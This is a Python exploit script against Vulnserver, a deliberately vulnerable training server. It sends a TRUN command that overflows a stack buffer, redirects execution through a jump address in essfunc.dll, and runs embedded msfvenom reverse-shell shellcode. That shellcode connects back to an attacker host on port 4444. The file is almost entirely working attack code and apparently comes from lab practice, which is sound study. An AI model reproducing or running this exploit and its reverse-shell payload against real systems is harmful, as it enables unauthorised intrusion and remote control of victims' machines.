#!/usr/bin/python

#
# Vulnserver Buffer Overflow
# Binary Author: stephenbradshaw - https://github.com/stephenbradshaw/vulnserver
# Exploit Author: 0xsaso
#

import socket

# Target info
server = "10.10.118.134"
port = 9999

# Immutable payload info
prefix = "TRUN ."
suffix = "\r\n"

# Attack vars
filler = "A" * 2006             # offset at 2006
eip = "\xaf\x11\x50\x62"        # essfunc.dll: 0x625011af
nops = "\x90" * 16              # NOP sled

# bad characters: x00
# msfvenom -p windows/shell_reverse_tcp LHOST-10.6.19.60 LPORT=4444 -b '\x00' -f python
shellcode = ""
shellcode += "\xdb\xd4\xd9\x74\x24\xf4\xb8\x12\x06\x66\xe5\x5a\x31"
shellcode += "\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\x50\x15\x84"
shellcode += "\x10\xa8\xf1\xca\xdb\x50\x02\xab\x52\xb5\x33\xeb\x01"
shellcode += "\xbe\x64\xdb\x42\x92\x88\x90\x07\x06\x1a\xd4\x8f\x29"
shellcode += "\xab\x53\xf6\x04\x2c\xcf\xca\x07\xae\x12\x1f\xe7\x8f"
shellcode += "\xdc\x52\xe6\xc8\x01\x9e\xba\x81\x4e\x0d\x2a\xa5\x1b"
shellcode += "\x8e\xc1\xf5\x8a\x96\x36\x4d\xac\xb7\xe9\xc5\xf7\x17"
shellcode += "\x08\x09\x8c\x11\x12\x4e\xa9\xe8\xa9\xa4\x45\xeb\x7b"
shellcode += "\xf5\xa6\x40\x42\x39\x55\x98\x83\xfe\x86\xef\xfd\xfc"
shellcode += "\x3b\xe8\x3a\x7e\xe0\x7d\xd8\xd8\x63\x25\x04\xd8\xa0"
shellcode += "\xb0\xcf\xd6\x0d\xb6\x97\xfa\x90\x1b\xac\x07\x18\x9a"
shellcode += "\x62\x8e\x5a\xb9\xa6\xca\x39\xa0\xff\xb6\xec\xdd\x1f"
shellcode += "\x19\x50\x78\x54\xb4\x85\xf1\x37\xd1\x6a\x38\xc7\x21"
shellcode += "\xe5\x4b\xb4\x13\xaa\xe7\x52\x18\x23\x2e\xa5\x5f\x1e"
shellcode += "\x96\x39\x9e\xa1\xe7\x10\x65\xf5\xb7\x0a\x4c\x76\x5c"
shellcode += "\xca\x71\xa3\xf3\x9a\xdd\x1c\xb4\x4a\x9e\xcc\x5c\x80"
shellcode += "\x11\x32\x7c\xab\xfb\x5b\x17\x56\x6c\x6e\xee\x4b\x50"
shellcode += "\x06\xec\x6b\xb9\x8a\x79\x8d\xd3\x22\x2c\x06\x4c\xda"
shellcode += "\x75\xdc\xed\x23\xa0\x99\x2e\xaf\x47\x5e\xe0\x58\x2d"
shellcode += "\x4c\x95\xa8\x78\x2e\x30\xb6\x56\x46\xde\x25\x3d\x96"
shellcode += "\xa9\x55\xea\xc1\xfe\xa8\xe3\x87\x12\x92\x5d\xb5\xee"
shellcode += "\x42\xa5\x7d\x35\xb7\x28\x7c\xb8\x83\x0e\x6e\x04\x0b"
shellcode += "\x0b\xda\xd8\x5a\xc5\xb4\x9e\x34\xa7\x6e\x49\xea\x61"
shellcode += "\xe6\x0c\xc0\xb1\x70\x11\x0d\x44\x9c\xa0\xf8\x11\xa3"
shellcode += "\x0d\x6d\x96\xdc\x73\x0d\x59\x37\x30\x3d\x10\x15\x11"
shellcode += "\xd6\xfd\xcc\x23\xbb\xfd\x3b\x67\xc2\x7d\xc9\x18\x31"
shellcode += "\x9d\xb8\x1d\x7d\x19\x51\x6c\xee\xcc\x55\xc3\x0f\xc5"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, port))
print s.recv(1024)

buffer = prefix + filler + eip + nops + shellcode + suffix
s.send(buffer)
s.recv(1024)

